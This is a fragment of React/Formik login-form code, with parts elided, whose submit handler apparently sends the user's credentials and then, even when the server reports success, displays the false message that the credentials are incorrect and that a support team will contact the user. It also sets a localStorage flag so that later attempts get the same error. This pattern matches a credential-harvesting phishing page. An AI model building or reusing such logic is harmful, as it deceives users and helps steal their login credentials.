  ...
  const { errors, values, handleChange, handleSubmit, resetForm } = useFormik({
    ...
    onSubmit: async () => {
      ...
      if (localStorage.getItem("login") != null) {
        setLoader(true);
        setWrong(
          "Opps Your Credentials are not correct please wait our Suppport Team will contact you"
        );
        resetForm();
        ...
        if (res.success) {
          resetForm();
          localStorage.setItem("login", 1);
          setWrong("Opps Your Credentials are not correct please wait our Suppport Team will contact you");
          // Taost(
          //   "Opps Your Credentials is not correct please wait Suppport Team will contact you ",
          //   {
          //     duration: 4000,
          //     position: "top-center",
